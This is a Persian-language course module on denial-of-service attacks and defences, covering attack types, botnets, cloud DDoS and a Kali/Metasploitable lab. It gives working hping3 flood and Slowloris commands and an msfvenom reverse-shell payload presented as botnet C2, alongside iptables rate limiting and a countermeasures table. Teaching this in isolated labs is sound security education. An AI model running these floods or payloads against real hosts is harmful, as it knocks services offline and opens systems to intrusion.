# انکار سرویس (Denial of Service)

**مدت یادگیری**: ۳ ساعت
**سطح سختی**: متوسط
**پیش‌نیاز**: فایل ۰۲ (شبکه) و ۰۵ (اسکن)

---

## فهرست محتوا

- [فصل ۱: مقدمه DoS و DDoS](#فصل-۱-مقدمه-dos-و-ddos)
- [فصل ۲: انواع حملات](#فصل-۲-انواع-حملات)
- [فصل ۳: باتنت‌ها و ابزارها](#فصل-۳-باتنتها-و-ابزارها)
- [فصل ۴: DDoS ابری و AI](#فصل-۴-ddos-ابری-و-ai)
- [فصل ۵: آزمایشگاه و کاهش اثر](#فصل-۵-آزمایشگاه-و-کاهش-اثر)

---

## فصل ۱: مقدمه DoS و DDoS

### مقدمه

**DoS (Denial of Service)** یعنی از کار انداختن یک سرویس با مصرف منابع آن. **DDoS** نسخه توزیع‌شده آن است که از هزاران سیستم انجام می‌شود.

> **تشبیه:** DoS مثل این است که یک نفر درِ مغازه را بگیرد؛ DDoS مثل این است که هزار نفر همزمان در را بگیرند — مغازه کاملاً تعطیل می‌شود.

### مفاهیم اساسی

**تفاوت DoS و DDoS:**

| ویژگی | DoS | DDoS |
|-------|-----|------|
| منبع | یک سیستم | هزاران سیستم |
| قدرت | محدود | عظیم |
| تشخیص | آسان‌تر | سخت‌تر |
| ابزار | hping، LOIC | باتنت |

**انواع هدف:** پهنای باند، CPU، حافظه، اتصالات، برنامه.

**تأثیر:** قطع سرویس = نقض Availability (یکی از اضلاع CIA).

### نکات مهم (Tips & Tricks)

- DoS/DDoS **غیرقانونی** است مگر با مجوز. فقط در محیط آزمایشگاهی.
- هدف اصلی **دسترس‌پذیری** است.
- دفاع = ترکیب **کاهش، تشخیص و پاسخ**.

### خلاصه فصل

- DoS یک منبع، DDoS هزاران منبع.
- هدف: منابع سرور (باند، CPU، حافظه).
- تهدید مستقیم Availability.

---

## فصل ۲: انواع حملات

### مقدمه

حملات DoS به سه دسته اصلی تقسیم می‌شوند.

### مفاهیم اساسی

**۱. Volumetric (حجمی):** پر کردن پهنای باند.
- UDP Flood، ICMP Flood، DNS Amplification، NTP Amplification.

**۲. Protocol (پروتکلی):** مصرف منابع شبکه/اتصال.
- SYN Flood، Ping of Death، Smurf Attack، Fragmentation.

**۳. Application-Layer (لایه ۷):** مصرف منابع برنامه.
- HTTP Flood، Slowloris، Slow POST، ReDoS.

**حملات Amplification:** ارسال درخواست کوچک، دریافت پاسخ بزرگ (DNS، NTP، Memcached).

### مثال عملی

```bash
# === SYN Flood با hping3 ===
sudo hping3 -S --flood -V -p 80 192.168.56.101
# -S : فلگ SYN
# --flood : ارسال حداکثری
# -V : پرحرف

# === UDP Flood ===
sudo hping3 --udp --flood -d 120 192.168.56.101

# === ICMP Flood ===
sudo hping3 --icmp --flood 192.168.56.101

# === Slowloris (لایه ۷) ===
slowloris 192.168.56.101 -p 80

# === HTTP Flood با ابزار ===
# goldeneye 192.168.56.101
```

### اشکال شایع

- **مشکل:** حمله اثر ندارد → هدف مقاوم است یا فایروال محدود می‌کند.
- **مشکل:** شبکه محلی خودم قطع شد → در محیط ایزوله و با احتیاط تست کنید.
- **مشکل:** سیستم هدف کرش کرد → اسنپ‌شات و بازیابی.

### نکات مهم (Tips & Tricks)

- **Slowloris** با ترافیک کم مؤثر است (مخفی و خطرناک).
- **Amplification** ضریب بزرگ‌نمایی بالایی دارد.
- حمله لایه ۷ سخت‌تر از لایه ۳/۴ تشخیص داده می‌شود.

### خلاصه فصل

- سه دسته: Volumetric، Protocol، Application-Layer.
- hping3 ابزار اصلی، Slowloris برای لایه ۷.
- Amplification با پاسخ بزرگ، مؤثر است.

---

## فصل ۳: باتنت‌ها و ابزارها

### مقدمه

**Botnet** شبکه‌ای از دستگاه‌های آلوده (Bot) است که توسط **Botmaster** کنترل می‌شوند و برای DDoS استفاده می‌شوند.

### مفاهیم اساسی

**ساختار باتنت:** Botmaster → C2 Server → Bots (زومبی).
**نمونه‌ها:** Mirai (IoT)، Emotet، Necurs.
**مدل اجاره:** DDoS-for-Hire (Booter/Stresser).

**ابزارهای کلاسیک (آموزشی):**
- **LOIC/HOIC:** رابط ساده (اغلب توسط افراد کم‌تجربه).
- **hping3:** خط فرمان انعطاف‌پذیر.
- **Slowloris:** لایه ۷.
- **GoldenEye، HULK:** HTTP Flood.

### مثال عملی

```bash
# === شبیه‌سازی باتنت با چند VM (آموزشی) ===
# روی هر VM:
sudo hping3 -S --flood -p 80 <TARGET>

# === C2 ساده (آموزشی) ===
# در Kali:
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f elf -o bot.elf
# در multi/handler اتصال بگیرید و از چند VM اجرا کنید

# === مانیتورینگ حمله ===
# روی هدف: iftop یا nload برای مشاهده پهنای باند
sudo iftop -i eth0
```

### اشکال شایع

- **مشکل:** تعداد بات کم است → در واقعیت باتنت هزاران بات دارد.
- **مشکل:** C2 شناسایی می‌شود → در واقعیت از DGA و رمزنگاری استفاده می‌شود.

### نکات مهم (Tips & Tricks)

- باتنت‌های IoT (Mirai) خطرناک‌اند چون دستگاه‌های IoT امنیت کمی دارند.
- **DDoS-for-Hire** دسترسی به حمله را ساده کرده.
- دفاع: Blackhole Routing، Rate Limiting، Scrubbing Center.

### خلاصه فصل

- Botnet = شبکه دستگاه‌های آلوده.
- C2 کنترل مرکزی است.
- Mirai نمونه IoT است.

---

## فصل ۴: DDoS ابری و AI

### مقدمه

رایانش ابری و AI هم حمله را آسان‌تر و هم دفاع را هوشمندتر کرده‌اند.

### مفاهیم اساسی

**DDoS در فضای ابری:**
- مهاجم می‌تواند منابع ابری را اجاره و حمله کند (Cloud-based DDoS).
- حمله به خود سرویس‌های ابری (مثل AWS، Azure).
- **Serverless/Container** می‌تواند به‌سرعت مقیاس شود و هزینه ایجاد کند (Economic DoS).

**AI در DDoS:**
- **سمت مهاجم:** بهینه‌سازی الگوهای حمله، تطبیق با دفاع، باتنت هوشمند.
- **سمت مدافع:** تشخیص ناهنجاری ترافیک، پیش‌بینی حمله، پاسخ خودکار.

**دفاع ابری:** Cloudflare، AWS Shield، Akamai، Google Cloud Armor.

### مثال عملی

```text
# نمونه کاربرد AI در دفاع:
"الگوی ترافیک عادی: [داده baseline].
ترافیک فعلی: [داده لحظه‌ای].
آیا ناهنجاری وجود دارد؟ منبع احتمالی؟ سطح خطر؟"
```

### اشکال شایع

- **مشکل:** فکر می‌کنم ابر همیشه امن است → پیکربندی اشتباه می‌تواند هزینه و قطعی ایجاد کند.
- **مشکل:** WAF همه‌چیز را می‌گیرد → WAF لایه ۷ است، برای لایه ۳/۴ کافی نیست.

### نکات مهم (Tips & Tricks)

- **Auto-scaling** بدون محدودیت = هزینه نجومی در حمله.
- دفاع چندلایه: CDN + WAF + Rate Limiting + Scrubbing.
- AI برای **تشخیص زودهنگام** حیاتی است.

### خلاصه فصل

- ابر حمله را ارزان‌تر کرده.
- AI هم مهاجم و هم مدافع را تقویت می‌کند.
- دفاع ابری (Cloudflare، AWS Shield) ضروری است.

---

## فصل ۵: آزمایشگاه و کاهش اثر

### مقدمه

یک آزمایشگاه DoS امن (در محیط ایزوله) و راه‌های کاهش اثر.

### مثال عملی — آزمایشگاه

```bash
# === پیش‌نیاز: محیط ایزوله ===
# Kali (مهاجم) + Metasploitable (هدف) در شبکه Host-Only

# === ۱. مانیتورینگ هدف ===
# در هدف (Metasploitable):
sudo apt install -y iftop
sudo iftop -i eth0

# === ۲. SYN Flood محدود (آموزشی) ===
sudo hping3 -S -p 80 -c 1000 -i u100 192.168.56.101
# -c : تعداد، -i : فاصله (میکروثانیه)

# === ۳. Slowloris ===
sudo apt install -y slowloris
slowloris 192.168.56.101 -p 80 -s 500

# === ۴. مشاهده اثر ===
# در هدف: بررسی مصرف منابع
top
ss -s   # خلاصه اتصالات

# === ۵. دفاع: Rate Limiting با iptables ===
sudo iptables -A INPUT -p tcp --dport 80 -m limit --limit 25/minute --limit-burst 100 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 80 -j DROP
```

### اشکال شایع

- **مشکل:** حمله سیستم میزبان را هم کند می‌کند → محدود و کنترل‌شده تست کنید.
- **مشکل:** دفاع iptables اثر ندارد → لایه را درست انتخاب کنید.

### نکات مهم (Tips & Tricks)

- همیشه **محدود و کنترل‌شده** تست کنید (`-c` و `-i`).
- **SYN Cookies** دفاع مؤثر در برابر SYN Flood.
- **CDN** ترافیک را توزیع و جذب می‌کند.

### اقدامات متقابل (Countermeasures)

| حمله | راهکار دفاعی |
|------|--------------|
| Volumetric | CDN، Scrubbing، Blackhole |
| SYN Flood | SYN Cookies، Rate Limiting |
| UDP/ICMP Flood | فیلتر، محدودسازی نرخ |
| Amplification | غیرفعال‌سازی سرویس‌های باز (DNS، NTP، Memcached) |
| Application-Layer | WAF، CAPTCHA، Rate Limiting |
| Slowloris | محدودیت زمان اتصال، Reverse Proxy |

### خلاصه فصل

- آزمایشگاه ایزوله با hping3 و Slowloris.
- دفاع: Rate Limiting، SYN Cookies، CDN، WAF.
- تست محدود و کنترل‌شده.

---

## منابع و مراجع

- **hping3:** http://www.hping.org/
- **Cloudflare DDoS Learning:** https://www.cloudflare.com/learning/ddos/
- **AWS Shield:** https://aws.amazon.com/shield/
- **OWASP — DoS:** https://owasp.org/www-community/attacks/Denial_of_Service
- **Mirai Botnet Analysis:** https://www.rapid7.com/blog/
- **CISA DDoS Guide:** https://www.cisa.gov/
